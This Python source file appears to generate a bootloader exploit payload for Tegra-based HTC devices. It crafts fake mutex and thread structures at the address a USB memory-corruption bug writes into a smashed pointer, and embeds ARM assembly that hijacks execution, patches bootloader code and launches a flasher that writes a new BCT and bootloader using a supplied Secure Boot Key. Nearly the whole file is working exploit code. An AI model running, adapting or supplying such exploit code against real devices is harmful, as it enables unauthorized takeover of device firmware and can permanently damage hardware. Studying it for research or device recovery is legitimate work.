import argparse
import struct

import utils
import asm
import consts
import flasher_payload

#Address that handle data must be located as the USB sets this address in smashed pointer
HANDLE_ADDR = 0x81000000
#Extra space after handle address
HANDLE_SIZE = 0x2000
#Allocated stack size
STACK_SIZE = 0x1000
#Mutex struct size
MUTEX_SIZE = 0x18
#Thread struct size
THREAD_SIZE = 0xb4


# The final file layout to send over fastboot is as following:
# ------------------------------------------------------------------------------------------------------
# | Payload padding / get_payload_padding           | Payload                                          |
# |-------------------------------------------------|--------------------------------------------------|
# | Padding | Stack | Code | Handle data | Padding  | Payload code | Payload data | Flasher Diag image |
# |------------------------|------------------------|---------------------------------------------------
# ^-- get_fastboot_start   ^-- HANDLE_ADDR          ^-- get_payload_start

########################################################################################################################
# Buffer Memory

class BufferMemory:
    #Value for non set memory
    DEFAULT_VALUE = 0

    buf = None
    fastboot_start = 0
    payload_start = 0
    
    def __init__(self, hboot_ver, extra_len):
        self.fastboot_start = utils.get_fastboot_start(hboot_ver)
        self.payload_start = utils.get_payload_address(hboot_ver)
        self.buf = bytearray(self.payload_start - self.fastboot_start + extra_len)
    
    def unpack(self, fmt, addr):
        l = utils.struct.calcsize(fmt)
        buf_addr = addr - self.fastboot_start
        assert 0 <= buf_addr and buf_addr + l <= len(self.buf), "out of bounds 0x%x when reading (%x bytes)" % (addr, l)
        return utils.struct.unpack_from(fmt, self.buf, buf_addr)[0], addr + l
    
    def pack(self, fmt, addr, val):
        l = utils.struct.calcsize(fmt)
        buf_addr = addr - self.fastboot_start
        assert 0 <= buf_addr and buf_addr + l <= len(self.buf), "out of bounds 0x%x when writing 0x%x (%x bytes)" % (addr, val, l)
        oldval = utils.struct.unpack_from("<" + ("B" * l), self.buf, buf_addr)
        for ov in oldval:
            assert self.DEFAULT_VALUE == ov, "value was 0x%x instead of 0x%x at 0x%x when writing 0x%x (%x bytes)" % (ov, self.DEFAULT_VALUE, addr, val, l)
        utils.struct.pack_into(fmt, self.buf, buf_addr, val)
        return addr + l
    
    def pack32(self, addr, val):
        return self.pack("<I", addr, val)
    
    def pack64(self, addr, val):
        return self.pack("<Q", addr, val)
    
    def pack32s(self, addr, vals):
        for val in vals:
            addr = self.pack32(addr, val)
        return addr
    
    def pack64s(self, addr, vals):
        for val in vals:
            addr = self.pack64(addr, val)
        return addr
    
    def memset(self, addr, val, length):
        while 8 <= length:
            length -= 8
            tv = val << 8
            tv |= tv << 16
            tv |= tv << 32
            addr = self.pack64(addr, tv)
    
        while 4 <= length:
            length -= 4
            tv = val << 8
            tv |= tv << 16
            addr = self.pack32(addr, tv)
    
        if 0 < length:
            for _ in range(length):
                addr = self.pack("<B", addr, val)
        return addr
    
    def memcopy(self, dst_addr, src_buf, src_addr, length):
        block_fmt = "<" + ("Q" * 4)
        block_size = utils.struct.calcsize(block_fmt)
        while block_size <= length:
            vals = utils.struct.unpack_from(block_fmt, src_buf, src_addr)
            src_addr += block_size
            dst_addr = self.pack64s(dst_addr, vals)
            length -= block_size
            
        while 4 <= length:
            val = utils.struct.unpack_from("<I", src_buf, src_addr)[0]
            src_addr += 4
            dst_addr = self.pack32(dst_addr, val)
            length -= 4
    
        if 0 < length:
            for _ in range(length):
                val = utils.struct.unpack_from("<B", src_buf, src_addr)[0]
                src_addr += 1
                dst_addr = self.pack("<B", dst_addr, val)
                
                
    def store_data(self, addr, data, align = None):
        addr -= len(data)
        if align is not None:
            while addr % align != 0:
                addr -= 1
        self.memcopy(addr, data, 0, len(data))
        return addr
    
    def store_code(self, addr, thumb, align, code):
        code_compiled = asm.compile_arm(code, thumb=thumb)
        addr = self.store_data(addr, data = code_compiled, align = align)
        return addr, len(code_compiled)

########################################################################################################################

def simulate_layout(buf: BufferMemory, stack_pointer):
    verbose = False
    mutex_ptr = buf.unpack("<I", HANDLE_ADDR + 0x30C)[0]
    handle_count = buf.unpack("<I", HANDLE_ADDR + 0x410)[0]
    if verbose: print("Checking mutex: 0x%x and handle count: %s" % (mutex_ptr, handle_count))
    assert 1 < handle_count
    mutex_owner = buf.unpack("<I", mutex_ptr)[0]
    if verbose: print("Checking mutex owner: 0x%x" % mutex_owner)
    assert mutex_owner == 0
    thread_queue_ptr = buf.unpack("<I", mutex_ptr + 0xC)[0]
    if verbose: print("Checking thread queue pointer: 0x%x" % thread_queue_ptr)
    mutex_queue_null_ptr = buf.unpack("<I", mutex_ptr + 0x14)[0]
    if verbose: print("Checking mutex queue null pointer: 0x%x" % mutex_queue_null_ptr)
    assert mutex_queue_null_ptr == 0
    thread_ptr = thread_queue_ptr - 0x98
    if verbose: print("Checking thread: 0x%x" % thread_ptr)
    assert buf.unpack("<I", thread_ptr)[0] == stack_pointer
    assert buf.unpack("<I", thread_ptr + 0x4)[0] != 0
    assert buf.unpack("<I", thread_ptr + 0x1C)[0] == 0
    assert buf.unpack("<I", thread_ptr + 0x20)[0] == 0
    assert buf.unpack("<I", thread_ptr + 0x24)[0] == thread_ptr + 0x2C
    assert buf.unpack("<I", thread_ptr + 0x28)[0] == 0
    assert buf.unpack("<I", thread_ptr + 0x2C)[0] == 0
    assert buf.unpack("<I", thread_ptr + 0x30)[0] == 0
    assert buf.unpack("<I", thread_ptr + 0x34)[0] == thread_ptr + 0x20
    assert buf.unpack("<I", thread_ptr + 0x38)[0] == 1
    thread_sync_queue = buf.unpack("<I", thread_ptr + 0x98)[0]
    assert thread_sync_queue == thread_ptr or thread_sync_queue == 0
    assert buf.unpack("<I", thread_ptr + 0x9C)[0] > 0x81000000
    assert buf.unpack("<I", thread_ptr + 0xA0)[0] > 0x81000000
    assert buf.unpack("<I", thread_ptr + 0xA4)[0] == thread_ptr
    assert buf.unpack("<I", thread_ptr + 0xA8)[0] > 0x81000000
    assert buf.unpack("<I", thread_ptr + 0xAC)[0] > 0x81000000
    assert buf.unpack("<I", thread_ptr + 0xB0)[0] == 0xDECAFBAD

def setup_thread_struct(buf: BufferMemory, addr, stack_pointer, stack_base, scratch_addr):
    #Stack pointer (with prefilled data for registers)
    buf.pack32(addr + 0x0, stack_pointer)
    #Stack base location
    buf.pack32(addr + 0x4, stack_base)
    #Thread state, written so no need to write
    buf.pack32(addr + 0x8, 0)
    #Thread number
    buf.pack32(addr + 0xC, 2)
    #Other stuff
    buf.memset(addr + 0x10, 0, 0x14)
    buf.pack32(addr + 0x24, addr + 0x2C)
    buf.memset(addr + 0x28, 0, 0xC)
    buf.pack32(addr + 0x34, addr + 0x20)
    buf.pack32(addr + 0x38, 1)
    buf.memset(addr + 0x40, 0, 0x98-0x40)
    #Thread mutex queue, this being null prevents this thread struct from being added into queue
    buf.pack32(addr + 0x98, addr)
    buf.pack32(addr + 0x9C, scratch_addr + 0x10)
    buf.pack32(addr + 0xA0, scratch_addr + 0x20)
    #Thread running queue
    buf.pack32(addr + 0xA4, addr)
    buf.pack32(addr + 0xA8, scratch_addr + 0x30)
    buf.pack32(addr + 0xAC, scratch_addr + 0x40)
    #Magic?
    buf.pack32(addr + 0xB0, 0xDECAFBAD)

def setup_mutex_struct(buf: BufferMemory, mutex_addr, thread_addr):
    #Mutex owner ptr (null will set current thread as owner and set mutex counter = 1)
    buf.pack32(mutex_addr, 0)
    #Mutex list head ptr, we pass our thread mutex queue, so it injects our thread later into running queue
    buf.pack32(mutex_addr + 0xC, thread_addr + 0x98)
    #Mutex list tail ptr, has to be diff value than head ptr
    buf.pack32(mutex_addr + 0x14, 0)

"""
Thread switch stack content
"""
def setup_stack(args, buf: BufferMemory, hboot_ver, payload_buf, flasher_len, thread_addr, mutex_addr):
    payload_checksum = utils.checksum(payload_buf)
    payload_addr = utils.get_payload_address(hboot_ver)
    payload_len = len(payload_buf)
    flasher_addr = payload_addr + payload_len - flasher_len
    hboot_cfg = consts.HBOOT_CONFIG[hboot_ver]
    hboot_mode_cfg = hboot_cfg["mode_" + args.mode]
        
    #Stuff to store for later use
    store_addr = HANDLE_ADDR - 0x1000
    hboot_ver_addr = store_addr = buf.store_data(store_addr, bytes(hboot_ver + "\0", "ascii"))
    not_replug_text_addr = store_addr = buf.store_data(store_addr, bytes("-DP: Do NOT plug USB back!\0", "ascii"))
    flashing_text_addr = store_addr = buf.store_data(store_addr, bytes("-DP: Flashing, will restart soon, please wait\0", "ascii"))
    
    reboot_code = f"""
    RebootPMC:
        {asm.mov32("r12", consts.PMC_ADDR)};
        mov     r11, {hex(consts.PMC_REBOOT)};
        str     r11, [r12];
        //Shouldn't reach here
        b       RebootPMC;
    """
    
    diag_launch_code = f"""
        //Print text
        {asm.mov32("r0", flashing_text_addr)};
        mov r1, 0xf800;
        {asm.mov32("r8", hboot_cfg["print_log_func"])};
        blx     r8;
        
        //Run DIAG image (hboot repurposed as flasher)
        {asm.mov32("r0", flasher_addr)};
        {asm.mov32("r1", flasher_len)};
        {asm.mov32("r8", hboot_cfg["jump_to_func"])};
        blx     r8;
    """

    #after_version_check_code: Code to run after version check is OK
    #operation_code: Code to run in loader once all checks are OK
    if args.mode == "normal":
        #This code is used to hotfix exploit
        HOTFIX_LEN = 4
        exploit_hotfix_code_addr, exploit_hotfix_code_len = buf.store_code(store_addr, thumb=True, align=None, code=f"""
            //Originally it ORs r0 and r2<<8 into r10
            //Here we limit desc len since usual usb storages dont need that much anyway
            and.w r10, r0, 0x3f;
        """)
        store_addr = exploit_hotfix_code_addr
        if exploit_hotfix_code_len != HOTFIX_LEN:
            raise Exception("Hotfix length doesnt match! 0x%x must be 0x%x" % (exploit_hotfix_code_len, HOTFIX_LEN))
        
        after_version_check_code = f"""
        //Hotfix to avoid crashing when running exploit again
        mov     r10, 0x21;
        bl      DumpRegs;
        {asm.mov32("r0", hboot_mode_cfg["exploit_hotfix_addr"])};
        {asm.mov32("r1", exploit_hotfix_code_addr)};
        {asm.mov32("r2", exploit_hotfix_code_len)};
        bl      DataCopy;
        """
        
        #Main thread code to run that handles preparations after exploit, in thumb mode
        #This piece of code is injected into a code that is run after USB stuff
        #Copied byte a byte so no alignment need
        hijack_code_addr, hijack_code_len = buf.store_code(store_addr, thumb=True, align=None, code=f"""
            {asm.mov32("r0", not_replug_text_addr)};
            mov r1, 0xf800;
            {asm.mov32("r8", hboot_cfg["print_log_func"])};
            blx     r8;
        
            {diag_launch_code}
            
            //Shouldn't reach here
            {reboot_code}
        """)
        store_addr = hijack_code_addr
        print("  - Hijack code addr: 0x%x len: 0x%x" % (hijack_code_addr, hijack_code_len))
        
        operation_code = f"""
        //Copy hijack code
        mov     r10, 0x22;
        bl      DumpRegs;
        {asm.mov32("r0", hboot_mode_cfg["hijack_addr"])};
        {asm.mov32("r1", hijack_code_addr)};
        {asm.mov32("r2", hijack_code_len)};
        bl      DataCopy;
        
        //Terminate thread
        mov     r10, 0x23;
        bl      DumpRegs;
        {asm.mov32("r8", hboot_cfg["thread_kill_func"])};
        blx     r8;
        """
        
    elif args.mode == "immediate":
        unplug_text_addr = store_addr = buf.store_data(store_addr, bytes("-DP: Please unplug USB!\0", "ascii"))
        after_version_check_code = f"""
        //Stop main thread by manually setting thread context PC to thread kill
        mov     r10, 0x21;
        bl      DumpRegs;
        {asm.mov32("r0", hboot_mode_cfg["main_thread_ptr"])};
        {asm.mov32("r1", hboot_cfg["thread_kill_func"])};
        ldr     r0, [r0];
        //We have main thread's stack pointer in r0, we set PC register value at int 14th
        str     r1, [r0, {hex(14 * 4)}];
        """
        
        operation_code = f"""
        mov     r10, 0x22;
        bl      DumpRegs;
        //Print text and sleep a bit to give time to unplug cable
        {asm.mov32("r0", unplug_text_addr)};
        mov r1, 0xf800;
        {asm.mov32("r8", hboot_cfg["print_log_func"])};
        blx     r8;
        {asm.mov32("r0", not_replug_text_addr)};
        mov r1, 0xf800;
        {asm.mov32("r8", hboot_cfg["print_log_func"])};
        blx     r8;
        
        mov     r10, 0x23;
        bl      DumpRegs;
        mov r0, {hex(10000)};
        {asm.mov32("r8", hboot_mode_cfg["sleep_func"])};
        blx     r8;
        
        mov     r10, 0x24;
        bl      DumpRegs;
        {diag_launch_code}
        """
    else:
        raise Exception("Unknown mode " + args.mode)

    #Loader code that does initial setup, run in another thread, we need to avoid any call that may cause
    #thread to switch to main thread
    loader_code_addr, loader_code_len = buf.store_code(store_addr, thumb=False, align=4, code=f"""
        //Check magic
        mov     r10, 0x10;
        bl      DumpRegs;
        {asm.mov32("r2", HANDLE_ADDR)};
        {asm.mov32("r1", consts.MAGIC)};
        ldr     r0, [r2];
        cmp     r0, r1;
        bne     ErrorBadEnv;
        
        //Make sure exploit is not run again and does nothing
        mov     r10, 0x11;
        bl      DumpRegs;
        {asm.mov32("r0", 0xAAAAAAAA)};
        str     r0, [r2];
        mov     r0, 0;
        {asm.mov32("r1", thread_addr + 0x98)};
        str     r0, [r1];
        {asm.mov32("r1", mutex_addr)};
        str     r0, [r1];
        {asm.mov32("r1", mutex_addr + 0xC)};
        str     r0, [r1];
        
        //Check version is compatible before we start calling and patch stuff that might not match the expected state
        mov     r10, 0x12;
        bl      DumpRegs;
        {asm.mov32("r2", consts.HBOOT_VERSION_ADDR)};
        {asm.mov32("r3", hboot_ver_addr)}
        mov     r1, 0;
        mov     r5, 0;
        mov     r6, 0;
    VersionCheckLoop:
        ldrb    r5, [r2, r1];
        ldrb    r6, [r3, r1];
        cmp     r5, r6;
        //In case doesn't match reboot
        bne     ErrorBadEnv;
        add     r1, 1;
        cmp     r6, #0;
        //Bail only when reach null terminator in our string
        bne     VersionCheckLoop;
        
        //At this point we are safe to do our stuff as we are in correct target version
        
        {after_version_check_code}

        //Check magic
        mov     r10, 0x15;
        bl      DumpRegs;
        {asm.mov32("r1", consts.MAGIC)};
        {asm.mov32("r0", payload_addr - 4)};
        ldr     r2, [r0];
        cmp     r2, r1;
        bne     ErrorOccurred;
        mov     r10, 0x16;
        bl      DumpRegs;
        {asm.mov32("r0", payload_addr + payload_len)};
        ldr     r2, [r0];
        cmp     r2, r1;
        bne     ErrorOccurred;
        
        mov     r10, 0x17;
        bl      DumpRegs;
        {asm.mov32("r2", payload_len)};
        {asm.mov32("r5", payload_checksum)};
        {asm.mov32("r6", consts.CHECKSUM_MASK)};
        {asm.mov32("r7", payload_addr)};
        //Checksum value
        mov     r4, r6;
        //Index
        mov     r3, 0;
    ChecksumLoop:        
        //Load 4 bytes and do some XOR
        ldr     r0, [r7,r3];
        eor     r0, r6;
        eor     r0, r3;
        
        //Move some data around
        mov     r1, 0xFF;
        and     r1, r4, r1;
        mov     r1, r1, lsl #24;
        mov     r4, r4, lsr #4;
        
        //More XOR
        eor     r4, r1;
        eor     r4, r0;
        
        //Increment and exit if reached all data
        add     r3, 4;
        cmp     r3, r2;
        blo     ChecksumLoop;
        
        //Compare checksum
        cmp     r4, r5;
        beq     ChecksumOK;
        
        //Checksum error
        mov     r1, r4;
        mov     r2, r5;
        b       ErrorOccurred;
        
    ChecksumOK:        
        //Set next boot mode
        mov     r10, 0x19;
        bl      DumpRegs;
        {asm.mov32("r0", consts.HBOOT_REASON_FASTBOOT)};
        {asm.mov32("r1", consts.HBOOT_REASON_ADDR)};
        str r0, [r1];
        
        {operation_code}
        
        //Shouldn't reach here
        mov     r10, 0xf0;
        b       ErrorOccurred;
        
    DataCopy:
        // r0 = dst_ptr r1 = src_ptr r2 = len
        //Index
        mov     r3, 0;
        //Acc
        mov     r4, 0;
    DataCopyLoop:
        ldrb    r4, [r1, r3];
        strb    r4, [r0, r3];
        add     r3, 1;
        cmp     r3, r2;
        blo     DataCopyLoop;
        bx      lr;
                
    DumpRegs:
        //Dump registers for debugging
        {asm.mov32("r12", consts.FAILURE_DUMP_ADDR)};
        stmia   r12!, {asm.br("r0,r1,r2,r3,r4,r5,r6,r7,r8,r9,r10,lr")};
        bx      lr;
    
    ErrorOccurred:
    ErrorBadEnv:
        bl      DumpRegs;
        {reboot_code}
    """)
    
    print(" - Loader code addr: 0x%x len: 0x%x" % (loader_code_addr, loader_code_len))
    print(" - Payload addr: 0x%x len: 0x%x " % (payload_addr, payload_len))
    print(" - Payload end: 0x%x checksum: 0x%x " % (payload_addr + payload_len, payload_checksum))
    print(" - Flasher addr: 0x%x len: 0x%x" % (flasher_addr, flasher_len))
    
    #Thread switch stack content, this is our execution starting point
    stack_base = loader_code_addr - 0x1000
    stack_pointer = stack_base - STACK_SIZE
    stack_base_real = buf.pack32s(stack_pointer, [
        #r0 r1 r2 r3 r4 r5 r6 
        0, 0, 0, 0, 0, 0, 0,
        #r7 r8 r9 r10 r11 r12 LR
        0, 0, 0, 0, 0, 0, 0,
        #PC
        loader_code_addr,
        #CSPR, disable interrupts so bits 6,7 = 1
        0x600000DF
    ])
    assert stack_base_real <= stack_base, "Actual stack bigger than stack reserved size!"
    print("  - Stack: 0x%x len: 0x%x" % (stack_pointer, stack_base_real - stack_pointer))
    return stack_pointer, stack_base

def generate_exploit_buf(args, hboot_ver, payload_buf, flasher_len):
    #Address for avoiding writing things in important areas
    payload_len = len(payload_buf)
    buf = BufferMemory(hboot_ver, payload_len + 4)
    payload_end = buf.payload_start + payload_len
    scratch_addr = payload_end + 0x1000_0000
    mutex_addr = HANDLE_ADDR + 0x420
    thread_addr = mutex_addr + MUTEX_SIZE
    stack_pointer, stack_base = setup_stack(args, buf, hboot_ver, payload_buf, flasher_len, mutex_addr, thread_addr)
    print("Handle: 0x%x Mutex: 0x%x Thread: 0x%x" % (HANDLE_ADDR, mutex_addr, thread_addr))
    print("Payload end: 0x%x Scratch: 0x%x" % (payload_end, scratch_addr))
    buf.pack32(HANDLE_ADDR, consts.MAGIC)
    buf.pack32(HANDLE_ADDR + 0x30C, mutex_addr)
    #Points to NvRm handle count, is decremented and if reaches 0 it goes into a lot of code we are not interested
    buf.pack32(HANDLE_ADDR + 0x410, 0xC1)
    setup_mutex_struct(buf, mutex_addr, thread_addr)
    setup_thread_struct(buf, thread_addr, stack_pointer, stack_base, scratch_addr)
    buf.memcopy(buf.payload_start, payload_buf, 0, payload_len)
    buf.pack32(buf.payload_start - 4, consts.MAGIC)
    buf.pack32(payload_end, consts.MAGIC)
    simulate_layout(buf, stack_pointer)
    return buf.buf


def generate_depthcharge(args):    
    print("-> Encrypting BCT and bootloader with provided SBK")
    bct_enc, bl_enc = flasher_payload.encrypt_payload(args)
    with open("payload_enc_bct.bin", 'wb') as f: f.write(bct_enc)
    with open("payload_enc_bl.bin", 'wb') as f: f.write(bl_enc)

    print("-> Creating flasher payload with encrypted BCT and bootloader")
    flasher_payload_buf = flasher_payload.package_payload(bct_enc, bl_enc)

    for hboot_ver in consts.HBOOT_CONFIG.keys():
        if ("mode_" + args.mode) not in consts.HBOOT_CONFIG[hboot_ver].keys():
            continue
        print("-> HBoot: " + hboot_ver + " mode " + args.mode)
        print("-> Preparing flasher")
        flasher_buf = flasher_payload.prepare_flasher(args, hboot_ver)
        empty_len = utils.get_payload_padding(hboot_ver) - len(flasher_buf)
        if empty_len < 0:
            raise Exception("Flasher binary uses 0x%x and padding has 0x%x" % (len(flasher_buf), utils.get_payload_padding(hboot_ver)))

        print("-> Preparing flasher payload")
        flasher_code_buf = flasher_payload.prepare_flasher_payload(hboot_ver)
        #with open("payload_code.bin", 'wb') as f: f.write(flasher_code_buf)
        payload_buf = flasher_code_buf + flasher_payload_buf + flasher_buf

        print("-> Gluing payload with exploit loader")
        final_buf = generate_exploit_buf(args, hboot_ver, payload_buf, len(flasher_buf))
        with open("payload_%s_%s.bin" % (hboot_ver, args.mode), 'wb') as f:
            f.write(final_buf)


def main():
    args = argparse.ArgumentParser(description='Generates ZIP to be flashed with Tegra HBoot')
    args.add_argument("--bl", help="Bootloader to flash")
    args.add_argument("--bct", help="BCT of device to flash, bootloader hashes will be computed automatically")
    args.add_argument("--sbk", help="Secure Boot Key of device to flash")
    args.add_argument("--flasher", help="Binary to use for flashing, bootloader will be used if not set and is compatible")
    args.add_argument("--mode", help="Exploit mode: normal or immediate")
    args = args.parse_args()

    if args.bl is None:
        print("Bootloader is not specified!")
        exit(1)

    if args.bct is None:
        print("BCT is not specified!")
        exit(1)

    if args.flasher is None:
        if flasher_payload.verify_flasher(args.bl):
            print("Using bootloader as flasher")
            args.flasher = args.bl
        else:
            print("Flasher binary was not provided and provided bootloader doesn't support acting as flasher!")
            exit(1)

    if args.sbk is None:
        print("SBK is not specified!")
        exit(1)

    if args.mode is None:
        args.mode = "normal"

    utils.convert_sbk(args)
    
    generate_depthcharge(args)

    print("Finished")

if __name__ == '__main__':
    main()
